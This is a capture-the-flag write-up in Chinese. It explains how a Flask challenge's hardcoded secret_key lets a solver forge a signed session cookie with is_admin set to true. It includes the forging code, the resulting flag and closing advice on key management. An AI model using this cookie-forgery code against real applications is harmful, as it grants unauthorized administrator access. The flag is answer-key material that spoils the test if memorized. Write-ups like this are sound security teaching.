# Baby Web

## 题目简述

Flask 应用用签名 session 中的 `is_admin` 判断是否允许访问 `/flag`。题目公开的部分源码同时泄露固定的 `app.secret_key = "baby-web"`。Flask 默认 session 只保证客户端 Cookie 未被篡改，并不把内容保存在服务端；掌握密钥即可自行签发管理员 Cookie。

## 解题过程

检查页面源码可发现管理入口，访问后虽然不能直接获得 flag，但能确认权限来自 session。公开源码中的关键逻辑是：

```python
app.secret_key = "baby-web"

@app.route("/flag")
def flag():
    if session.get("is_admin"):
        return render_template("flag.html", flag=FLAG)
```

使用 Flask 自带的 `SecureCookieSessionInterface` 和相同密钥生成合法签名，而不是手工猜测序列化格式：

```python
from flask import Flask, session
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "baby-web"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)

with app.test_request_context():
    session["is_admin"] = True
    cookie = serializer.dumps(session)
```

把结果作为名为 `session` 的 Cookie 请求 `/flag`。服务端验签成功后直接信任其中的布尔值，返回：

```text
grey{0h_n0_mY_5up3r_53cr3t_4dm1n_fl4g}
```

## 方法总结

Flask session 的内容可由客户端读取，安全性完全依赖 `SECRET_KEY` 的保密性和强度。把固定示例密钥写进分发源码，相当于把所有 session 权限交给用户。生产环境应从安全随机源加载独立密钥并定期轮换，敏感权限还应结合服务端状态验证。
